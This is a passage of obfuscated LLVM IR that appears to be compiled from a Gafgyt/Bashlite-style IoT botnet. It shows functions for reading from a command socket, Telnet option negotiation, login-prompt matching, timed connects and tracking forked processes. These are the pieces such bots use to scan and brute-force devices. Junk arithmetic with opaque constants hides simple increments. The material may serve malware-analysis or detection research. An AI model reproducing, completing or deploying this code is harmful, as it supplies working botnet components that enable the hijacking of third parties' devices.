  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = xor i64 %43, -1
  %45 = xor i64 %37, -1
  %46 = xor i64 -5082616908697015036, -1
  %47 = and i64 %44, -5082616908697015036
  %48 = and i64 %43, %46
  %49 = and i64 %45, -5082616908697015036
  %50 = and i64 %37, %46
  %51 = or i64 %47, %48
  %52 = or i64 %49, %50
  %53 = xor i64 %51, %52
  %54 = or i64 %44, %45
  %55 = xor i64 %54, -1
  %56 = or i64 -5082616908697015036, %46
  %57 = and i64 %55, %56
  %58 = or i64 %53, %57
  %59 = or i64 %43, %37
  store i64 %58, i64* %42, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sub i32 0, 1
  %62 = sub i32 %60, %61
  %63 = add nsw i32 %60, 1
  %64 = call i32 @select(i32 %62, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %64, i32* %12, align 4
  %65 = icmp sle i32 %64, 0
  br i1 %65, label %66, label %113

; <label>:66:                                     ; preds = %33
  br label %67

; <label>:67:                                     ; preds = %105, %66
  %68 = load i32, i32* %13, align 4
  %69 = icmp slt i32 %68, 10
  br i1 %69, label %70, label %112

; <label>:70:                                     ; preds = %67
  %71 = load i32, i32* @mainCommSock, align 4
  %72 = call i32 (i32, i8*, ...) @sockprintf(i32 %71, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0))
  %73 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %73, align 8
  %74 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %74, align 8
  br label %75

; <label>:75:                                     ; preds = %70
  %76 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %77 = getelementptr inbounds [16 x i64], [16 x i64]* %76, i64 0, i64 0
  %78 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %77) #2, !srcloc !2
  %79 = extractvalue { i64, i64* } %78, 0
  %80 = extractvalue { i64, i64* } %78, 1
  %81 = trunc i64 %79 to i32
  store i32 %81, i32* %14, align 4
  %82 = ptrtoint i64* %80 to i64
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %15, align 4
  br label %84

; <label>:84:                                     ; preds = %75
  %85 = load i32, i32* %5, align 4
  %86 = srem i32 %85, 64
  %87 = zext i32 %86 to i64
  %88 = shl i64 1, %87
  %89 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %90 = load i32, i32* %5, align 4
  %91 = sdiv i32 %90, 64
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [16 x i64], [16 x i64]* %89, i64 0, i64 %92
  %94 = load i64, i64* %93, align 8
  %95 = and i64 %94, %88
  %96 = xor i64 %94, %88
  %97 = or i64 %95, %96
  %98 = or i64 %94, %88
  store i64 %97, i64* %93, align 8
  %99 = load i32, i32* %5, align 4
  %100 = sub i32 0, 1
  %101 = sub i32 %99, %100
  %102 = add nsw i32 %99, 1
  %103 = call i32 @select(i32 %101, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %103, i32* %12, align 4
  %104 = icmp sle i32 %103, 0
  br i1 %104, label %105, label %111

; <label>:105:                                    ; preds = %84
  %106 = load i32, i32* %13, align 4
  %107 = sub i32 %106, 736929815
  %108 = add i32 %107, 1
  %109 = add i32 %108, 736929815
  %110 = add nsw i32 %106, 1
  store i32 %109, i32* %13, align 4
  br label %67

; <label>:111:                                    ; preds = %84
  br label %112

; <label>:112:                                    ; preds = %111, %67
  br label %113

; <label>:113:                                    ; preds = %112, %33
  store i32 0, i32* %18, align 4
  %114 = load i8*, i8** %6, align 8
  store i8* %114, i8** %17, align 8
  br label %115

; <label>:115:                                    ; preds = %135, %113
  %116 = load i32, i32* %7, align 4
  %117 = sub i32 0, -1
  %118 = sub i32 %116, %117
  %119 = add nsw i32 %116, -1
  store i32 %118, i32* %7, align 4
  %120 = icmp sgt i32 %116, 1
  br i1 %120, label %121, label %140

; <label>:121:                                    ; preds = %115
  %122 = load i32, i32* @mainCommSock, align 4
  %123 = call i64 @recv(i32 %122, i8* %16, i64 1, i32 0)
  %124 = icmp ne i64 %123, 1
  br i1 %124, label %125, label %127

; <label>:125:                                    ; preds = %121
  %126 = load i8*, i8** %17, align 8
  store i8 0, i8* %126, align 1
  store i32 -1, i32* %4, align 4
  br label %143

; <label>:127:                                    ; preds = %121
  %128 = load i8, i8* %16, align 1
  %129 = load i8*, i8** %17, align 8
  %130 = getelementptr inbounds i8, i8* %129, i32 1
  store i8* %130, i8** %17, align 8
  store i8 %128, i8* %129, align 1
  %131 = load i8, i8* %16, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 10
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %127
  br label %140

; <label>:135:                                    ; preds = %127
  %136 = load i32, i32* %18, align 4
  %137 = sub i32 0, 1
  %138 = sub i32 %136, %137
  %139 = add nsw i32 %136, 1
  store i32 %138, i32* %18, align 4
  br label %115

; <label>:140:                                    ; preds = %134, %115
  %141 = load i8*, i8** %17, align 8
  store i8 0, i8* %141, align 1
  %142 = load i32, i32* %18, align 4
  store i32 %142, i32* %4, align 4
  br label %143

; <label>:143:                                    ; preds = %140, %125
  %144 = load i32, i32* %4, align 4
  ret i32 %144
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = and i64 %22, 2048
  %24 = xor i64 %22, 2048
  %25 = or i64 %23, %24
  %26 = or i64 %22, 2048
  store i64 %25, i64* %15, align 8
  %27 = load i32, i32* %6, align 4
  %28 = load i64, i64* %15, align 8
  %29 = call i32 (i32, i32, ...) @fcntl(i32 %27, i32 4, i64 %28)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %8, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #13
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %112

; <label>:40:                                     ; preds = %4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %42 = getelementptr inbounds [8 x i8], [8 x i8]* %41, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 8, i32 4, i1 false)
  %43 = load i32, i32* %6, align 4
  %44 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  store i32 %45, i32* %16, align 4
  %46 = load i32, i32* %16, align 4
  %47 = icmp slt i32 %46, 0
  br i1 %47, label %48, label %100

; <label>:48:                                     ; preds = %40
  %49 = call i32* @__errno_location() #13
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 115
  br i1 %51, label %52, label %98

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  br label %57

; <label>:57:                                     ; preds = %52
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #2, !srcloc !3
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  br label %66

; <label>:66:                                     ; preds = %57
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = and i64 %76, %70
  %78 = xor i64 %76, %70
  %79 = or i64 %77, %78
  %80 = or i64 %76, %70
  store i64 %79, i64* %75, align 8
  %81 = load i32, i32* %6, align 4
  %82 = sub i32 %81, 1215779472
  %83 = add i32 %82, 1
  %84 = add i32 %83, 1215779472
  %85 = add nsw i32 %81, 1
  %86 = call i32 @select(i32 %84, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %87 = icmp sgt i32 %86, 0
  br i1 %87, label %88, label %96

; <label>:88:                                     ; preds = %66
  store i32 4, i32* %13, align 4
  %89 = load i32, i32* %6, align 4
  %90 = bitcast i32* %14 to i8*
  %91 = call i32 @getsockopt(i32 %89, i32 1, i32 4, i8* %90, i32* %13) #2
  %92 = load i32, i32* %14, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %88
  store i32 0, i32* %5, align 4
  br label %112

; <label>:95:                                     ; preds = %88
  br label %97

; <label>:96:                                     ; preds = %66
  store i32 0, i32* %5, align 4
  br label %112

; <label>:97:                                     ; preds = %95
  br label %99

; <label>:98:                                     ; preds = %48
  store i32 0, i32* %5, align 4
  br label %112

; <label>:99:                                     ; preds = %97
  br label %100

; <label>:100:                                    ; preds = %99, %40
  %101 = load i32, i32* %6, align 4
  %102 = call i32 (i32, i32, ...) @fcntl(i32 %101, i32 3, i8* null)
  %103 = sext i32 %102 to i64
  store i64 %103, i64* %15, align 8
  %104 = load i64, i64* %15, align 8
  %105 = xor i64 -2049, -1
  %106 = xor i64 %104, %105
  %107 = and i64 %106, %104
  %108 = and i64 %104, -2049
  store i64 %107, i64* %15, align 8
  %109 = load i32, i32* %6, align 4
  %110 = load i64, i64* %15, align 8
  %111 = call i32 (i32, i32, ...) @fcntl(i32 %109, i32 4, i64 %110)
  store i32 1, i32* %5, align 4
  br label %112

; <label>:112:                                    ; preds = %100, %98, %96, %94, %39
  %113 = load i32, i32* %5, align 4
  ret i32 %113
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %62

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, -146365738383549315
  %13 = add i64 %12, 1
  %14 = sub i64 %13, -146365738383549315
  %15 = add i64 %11, 1
  store i64 %14, i64* @numpids, align 8
  %16 = load i64, i64* @numpids, align 8
  %17 = add i64 %16, -5859837941524059882
  %18 = add i64 %17, 1
  %19 = sub i64 %18, -5859837941524059882
  %20 = add i64 %16, 1
  %21 = mul i64 %19, 4
  %22 = call noalias i8* @malloc(i64 %21) #2
  %23 = bitcast i8* %22 to i32*
  store i32* %23, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %24

; <label>:24:                                     ; preds = %42, %10
  %25 = load i32, i32* %4, align 4
  %26 = zext i32 %25 to i64
  %27 = load i64, i64* @numpids, align 8
  %28 = sub i64 0, 1
  %29 = add i64 %27, %28
  %30 = sub i64 %27, 1
  %31 = icmp ult i64 %26, %29
  br i1 %31, label %32, label %49

; <label>:32:                                     ; preds = %24
  %33 = load i32*, i32** @pids, align 8
  %34 = load i32, i32* %4, align 4
  %35 = zext i32 %34 to i64
  %36 = getelementptr inbounds i32, i32* %33, i64 %35
  %37 = load i32, i32* %36, align 4
  %38 = load i32*, i32** %3, align 8
  %39 = load i32, i32* %4, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds i32, i32* %38, i64 %40
  store i32 %37, i32* %41, align 4
  br label %42

; <label>:42:                                     ; preds = %32
  %43 = load i32, i32* %4, align 4
  %44 = sub i32 0, %43
  %45 = sub i32 0, 1
  %46 = add i32 %44, %45
  %47 = sub i32 0, %46
  %48 = add i32 %43, 1
  store i32 %47, i32* %4, align 4
  br label %24

; <label>:49:                                     ; preds = %24
  %50 = load i32, i32* %2, align 4
  %51 = load i32*, i32** %3, align 8
  %52 = load i64, i64* @numpids, align 8
  %53 = sub i64 %52, -678816688381420904
  %54 = sub i64 %53, 1
  %55 = add i64 %54, -678816688381420904
  %56 = sub i64 %52, 1
  %57 = getelementptr inbounds i32, i32* %51, i64 %55
  store i32 %50, i32* %57, align 4
  %58 = load i32*, i32** @pids, align 8
  %59 = bitcast i32* %58 to i8*
  call void @free(i8* %59) #2
  %60 = load i32*, i32** %3, align 8
  store i32* %60, i32** @pids, align 8
  %61 = load i32, i32* %2, align 4
  store i32 %61, i32* %1, align 4
  br label %62

; <label>:62:                                     ; preds = %49, %8
  %63 = load i32, i32* %1, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.22, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %111, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %118

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %83, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %81

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = add i64 0, %29
  %31 = sub i64 0, %28
  %32 = getelementptr inbounds i8, i8* %26, i64 %30
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %79, label %36

; <label>:36:                                     ; preds = %22
  %37 = load i8*, i8** %3, align 8
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = sub i64 0, %42
  %44 = add i64 0, %43
  %45 = sub i64 0, %42
  %46 = getelementptr inbounds i8, i8* %40, i64 %44
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 32
  br i1 %49, label %79, label %50

; <label>:50:                                     ; preds = %36
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = add i64 0, 2842327330248381246
  %58 = sub i64 %57, %56
  %59 = sub i64 %58, 2842327330248381246
  %60 = sub i64 0, %56
  %61 = getelementptr inbounds i8, i8* %54, i64 %59
  %62 = load i8, i8* %61, align 1
  %63 = sext i8 %62 to i32
  %64 = icmp eq i32 %63, 13
  br i1 %64, label %79, label %65

; <label>:65:                                     ; preds = %50
  %66 = load i8*, i8** %3, align 8
  %67 = load i32, i32* %5, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = sub i64 0, %71
  %73 = add i64 0, %72
  %74 = sub i64 0, %71
  %75 = getelementptr inbounds i8, i8* %69, i64 %73
  %76 = load i8, i8* %75, align 1
  %77 = sext i8 %76 to i32
  %78 = icmp eq i32 %77, 10
  br label %79

; <label>:79:                                     ; preds = %65, %50, %36, %22
  %80 = phi i1 [ true, %50 ], [ true, %36 ], [ true, %22 ], [ %78, %65 ]
  br label %81

; <label>:81:                                     ; preds = %79, %18
  %82 = phi i1 [ false, %18 ], [ %80, %79 ]
  br i1 %82, label %83, label %89

; <label>:83:                                     ; preds = %81
  %84 = load i32, i32* %7, align 4
  %85 = sub i32 %84, -860689103
  %86 = add i32 %85, 1
  %87 = add i32 %86, -860689103
  %88 = add nsw i32 %84, 1
  store i32 %87, i32* %7, align 4
  br label %18

; <label>:89:                                     ; preds = %81
  %90 = load i8*, i8** %3, align 8
  %91 = load i32, i32* %5, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = load i32, i32* %7, align 4
  %95 = sext i32 %94 to i64
  %96 = sub i64 0, %95
  %97 = add i64 0, %96
  %98 = sub i64 0, %95
  %99 = getelementptr inbounds i8, i8* %93, i64 %97
  %100 = load i8, i8* %99, align 1
  %101 = sext i8 %100 to i32
  %102 = load i8*, i8** %4, align 8
  %103 = load i32, i32* %6, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %102, i64 %104
  %106 = load i8, i8* %105, align 1
  %107 = sext i8 %106 to i32
  %108 = icmp eq i32 %101, %107
  br i1 %108, label %109, label %110

; <label>:109:                                    ; preds = %89
  store i32 1, i32* %2, align 4
  br label %119

; <label>:110:                                    ; preds = %89
  br label %111

; <label>:111:                                    ; preds = %110
  %112 = load i32, i32* %6, align 4
  %113 = sub i32 0, %112
  %114 = sub i32 0, 1
  %115 = add i32 %113, %114
  %116 = sub i32 0, %115
  %117 = add nsw i32 %112, 1
  store i32 %116, i32* %6, align 4
  br label %11

; <label>:118:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %119

; <label>:119:                                    ; preds = %118, %109
  %120 = load i32, i32* %2, align 4
  ret i32 %120
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %151, %8
  %34 = load i32, i32* %18, align 4
  %35 = add i32 %34, 1623887975
  %36 = add i32 %35, 2
  %37 = sub i32 %36, 1623887975
  %38 = add nsw i32 %34, 2
  %39 = load i32, i32* %16, align 4
  %40 = icmp slt i32 %37, %39
  br i1 %40, label %41, label %51

; <label>:41:                                     ; preds = %33
  %42 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %43 = load i64, i64* %42, align 8
  %44 = icmp sgt i64 %43, 0
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %47 = load i64, i64* %46, align 8
  %48 = icmp sgt i64 %47, 0
  br label %49

; <label>:49:                                     ; preds = %45, %41
  %50 = phi i1 [ true, %41 ], [ %48, %45 ]
  br label %51

; <label>:51:                                     ; preds = %49, %33
  %52 = phi i1 [ false, %33 ], [ %50, %49 ]
  br i1 %52, label %53, label %152

; <label>:53:                                     ; preds = %51
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !4
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %24, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %25, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %10, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %69 = load i32, i32* %10, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = and i64 %73, %67
  %75 = xor i64 %73, %67
  %76 = or i64 %74, %75
  %77 = or i64 %73, %67
  store i64 %76, i64* %72, align 8
  %78 = load i32, i32* %10, align 4
  %79 = sub i32 0, 1
  %80 = sub i32 %78, %79
  %81 = add nsw i32 %78, 1
